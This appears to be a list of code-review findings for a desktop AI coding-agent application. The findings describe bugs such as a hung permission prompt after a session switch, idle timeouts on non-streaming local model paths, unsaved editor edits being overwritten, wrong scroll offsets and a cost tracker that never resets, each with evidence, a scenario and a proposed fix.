findings.scenario: Agent asks 'Allow edit_file to write: X?'. User clicks a different session in the sidebar (or /new) instead of answering. Messages.Clear() removes the prompt bubble; nobody can ever click Allow/Deny; _cts is never cancelled. AgentToolService.ExecuteToolAsync awaits OnPermissionRequired forever, SendMessage never reaches finally, IsGenerating stays true, and SendMessage() returns early on every future send (line 1364 'if (... || IsGenerating) return'). App is permanently mute until restart โ€” exactly the user's "เธกเธฑเธเธเนเธฒเธ" report. Bonus bleed: any tool events from the stuck loop now append into the NEWLY loaded session's Messages.
findings.fix: In LoadSession and NewSession: if IsGenerating, either block the switch ("Stop the current generation first") or call StopGeneration() and await loop unwind before clearing Messages. Additionally, keep a reference to the open permission prompt and TrySetResult(false) on any session switch/clear. Also add a configurable timeout (e.g. 5 min โ’ auto-deny) on the permission TCS as a last-resort net.

findings.title: 120s idle timeout kills healthy local tool-loop turns: llama-server/Ollama native paths are non-streaming and never reset the idle window
findings.evidence: LlamaServerProvider.ChatWithToolsAsync: "[\"stream\"] = false," (line 490) and the body never invokes the onTextDelta parameter. Same in OllamaProvider.ChatWithToolsAsync (line 322 '[\"stream\"] = false'). But CodeAgentService.cs:1658 'if (timeoutSec > 0) callCts.CancelAfter(TimeSpan.FromSeconds(timeoutSec));' is only reset inside onTextDelta (line 1668) โ€” the comment claims 'the window resets on every streamed chunk, so a healthy (even slow) generation is never cut off', which is false on both local native tool paths.

User reads it as 'เธเนเธฒเธ/เธเธฑเธ'. This silently breaks the #1-priority local path for every non-trivial edit.

findings.title: OnAgentStatus event has ZERO subscribers โ€” auto-verify, escalation, tool-call-salvage and compaction notices all fire into the void

findings.title: All 11 weak-model harness toggles are settings.json-only โ€” zero Settings UI (exact AppSettings fields)

findings.title: Live-follow clobbers unsaved editor edits: OnAgentFileMutated calls MarkOpened on a dirty tab with no confirmation
findings.evidence: CodeEditorViewModel.cs:128-132: "if (existing != null) { existing.MarkOpened(loaded.Content);   // refresh content in place (keep the tab object) ActiveTab = existing; }" โ€” MarkOpened (CodeEditorModels.cs:38-48) overwrites _content/_originalContent and sets _isDirty=false unconditionally. No IsDirty check. LiveEditFollow defaults to true (AppSettings.cs:69).
findings.scenario: User has Foo.cs open in the Code Editor with unsaved manual edits (dirty โ—). They ask the agent to tweak something else in the same file. Agent edit_file succeeds โ’ FileMutatedByAgent โ’ MarkOpened replaces the tab's buffer with the on-disk content โ’ the user's unsaved edits are silently destroyed AND the dirty flag is cleared, so there's no warning and no way back. Also steals ActiveTab focus on every agent edit (annoying during multi-file turns, user gets yanked between tabs while typing).
findings.fix: In OnAgentFileMutated: if existing.IsDirty, skip the in-place refresh (or show a non-destructive banner 'file changed on disk โ€” Reload / Keep mine') instead of MarkOpened. Only set ActiveTab when the editor page is actually visible, or make tab-stealing a sub-option of LiveEditFollow.

findings.title: Live-follow scroll uses a hardcoded 20px line height โ€” lands on the wrong line for non-default font/DPI
findings.evidence: OnScrollToLine: 'EditorScroll?.ScrollToVerticalOffset(Math.Max(0, idx * 20.0 - 60));' โ€” the TextBox is FontSize=13 mono; actual line height is ~17.3px at 96 DPI and scales with system DPI/text scaling, so the estimate drifts ~13% per line. Also 'EditorTextBox.Select(start, len)' renders no visible highlight because the TextBox is not focused (IsInactiveSelectionHighlightEnabled not set).
findings.scenario: Agent edits line 400 of a 600-line file โ’ live-follow scrolls to offset 400*20 instead of ~400*17.3 โ’ viewport lands ~60 lines past the change; the 'selection' marking the changed line is invisible. Feature appears broken ('it jumped somewhere random').
findings.fix: Compute the real line height (EditorTextBox.FontFamily.LineSpacing * FontSize, or GetRectFromCharacterIndex(start).Top) and scroll to that; set IsInactiveSelectionHighlightEnabled="True" on EditorTextBox so the selected line is visible without focus.

findings.title: Cost tracker is never reset per session and CostText refreshes only on a 5s timer โ€” 'Session API cost' tooltip lies
findings.evidence: CostTrackingService.Reset() (line 83) has zero callers (grep '_costTracker.Reset' โ’ no matches); ChatView.xaml:1329 ToolTip="Session API cost (USD)"; CostText is updated only inside the 5-second _memoryTimer tick (ChatViewModel.cs:494) โ€” the OnCostUpdated event (CostTrackingService.cs:24) is never subscribed.

findings.fix: Call _costTracker.Reset() in NewSession/LoadSession (or track per-session subtotals), and subscribe ChatViewModel to OnCostUpdated to refresh CostText immediately instead of polling.
